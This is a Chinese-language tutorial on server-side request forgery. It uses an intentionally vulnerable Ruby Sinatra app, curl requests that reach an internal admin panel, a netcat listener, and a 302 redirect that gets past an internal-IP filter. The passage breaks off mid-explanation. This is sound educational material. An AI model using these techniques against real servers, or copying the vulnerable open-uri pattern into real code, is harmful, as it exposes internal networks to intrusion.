_SSRF是服务端请求伪造的缩写，这类漏洞讲述的是黑客控制服务器发送请求的行为。这篇文章将着重于漏洞影响、如何测试漏洞，潜在的风险点，突破限制和警告。_
在深入ssrf漏洞影响前，花些时间了解下漏洞本身。漏洞出现于应用对外请求资源。举个例子，当你推特转发这篇文章时，推特上顶部就会出现这篇推文。页面的请求将返回HTML形式的图片、标题、描述。推特服务器向该页面发送请求下载这些信息并按需提取。最近一段时间，他们的链接常常遭受SSRF攻击。
这篇文章将解释什么场景下的对外请求才算安全问题以及如何利用漏洞。
# 安装
一台服务器向另外一个服务器发起请求可能是一个伪造的请求。通过安装在本地的应用尝试SSRF是理解这篇文章最有效的方法。为了达到本篇文章目的，假设我们将下列ruby代码运行在服务器上。
        require 'sinatra'
        require 'open-uri'
        get '/' do
          format 'RESPONSE: %s', open(params[:url]).read
        end
为了本地运行这些代码，将其保存为server.rb文件，执行gem install sinatra，接着执行ruby server.rb(我使用的是ruby
2.3.3p222版本)。现在你可以尝试访问 __
。在环回地址以外的地址运行该代码会引起[代码执行漏洞](&nbsp;&nbsp;&nbsp;&nbsp;https://sakurity.com/blog/2015/02/28/openuri.html)，所以不要这么做。
web服务器收到 __
请求时，_open()_函数会请求_
        hack-box-01 $ curl http://localhost:4567/\?
        url\=https://google.com
        RESPONSE: Google
在互联网上通过url访问网站并不让人兴奋，这本身并不会有问题。既然是位于互联网上，所有人都可以访问它。现在来考虑下局域网情况，大量网络隐藏在路由器和防火墙背后。路由器通过NAT将内部子网的流量与互联网进行交互。
为了清楚的了解影响，假设正在运行ruby代码的服务器IP是10.0.0.3，和它处于同一网络的另外一台服务器admin-panel的IP是10.0.0.2。admin-panel服务器在80端口开放着不需授权的web服务。路由器10.0.0.1负责路由内部流量到互联网。内部服务器之间没有任何防火墙规则。admin-panel是外网不可达的。通过web-server.com可以访问web服务器(10.0.0.3)。
我们知道web服务器10.0.0.3能够处理我们发送给它的请求。admin-panel服务器在4567端口上提供HTTP接口。现在来看看通过web服务器向admin-panel服务器发起请求会发生什么。
         hack-box-01 $ curl http://web-server.com:4567/\?url\=http://10.0.0.2/
        RESPONSE: Internal admin panel...
因为web服务器能够访问admin-panel(10.0.0.2)，所以web服务器会发送http请求给admin-panel，admin-panel将响应通过web服务器返回至外网。理所当然你可以把web服务器当成双向web代理，去往admin-panel的流量都必须经过10.0.0.3。
# 测试
既然你对SSRF有了基本的了解，接下来介绍如何测试。在我的SSRF漏洞经验里，自己拥有一台可控服务器是非常有益的。我倾向用DigitalOcean盒子提供的服务器去调适发现潜在的漏洞，无论什么服务器，只要你选择的服务器能够转发流量就行了。
接着通过ping你控制的服务器来调试_
        hack-box-1 $ nc -l -n -vv -p 8080 -k
        Listening on [0.0.0.0] (family 0, port 8080)
所有去往8080端口的流量将一览无遗。为了更好的讲述例子，假设hack-box-1的公网地址是1.2.3.4。现在使用去往web-server.com的请求ping我们的服务器：
hack-box-01 $ curl 
当你执行了上面的命令，netcat监听里能够看到如下http请求：
        hack-box-1 $ nc -l -n -vv -p 8080 -k
        Listening on [0.0.0.0] (family 0, port 8080)
        Connection from [masked] port 8080 [tcp/*] accepted (family 2, sport 45982)
        GET / HTTP/1.1
        Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
        Accept: */*
        User-Agent: Ruby
        Host: 1.2.3.4:8080
从上面可以看出，传给url参数的值作为了http请求的目的地址。过去几年里我见过的HTTP库都会遵从HTTP响应中的location跳转规律。如果你的服务器（例子中跑了netcat的那台）像下面这样返回响应，web-server.com将遵守这个响应跳转并对10.0.0.2发送请求。
    HTTP/1.1 302 Found
        Location: http://10.0.0.2/
        Content-Length: 0
这一点非常重要。公司实现风险控制的措施之一就是限制服务器对内服务或端口的链接。然而，这条限制并不应用于http重定向。假设我们的服务器是这样实现的：
        require 'sinatra'
        require 'open-uri'
        get '/' do
          url = URI.parse params[:url]
          halt 403 if url.host =~ /\A10\.0\.0\.\d+\z/
          format 'RESPONSE: %s', open(params[:url]).read
        end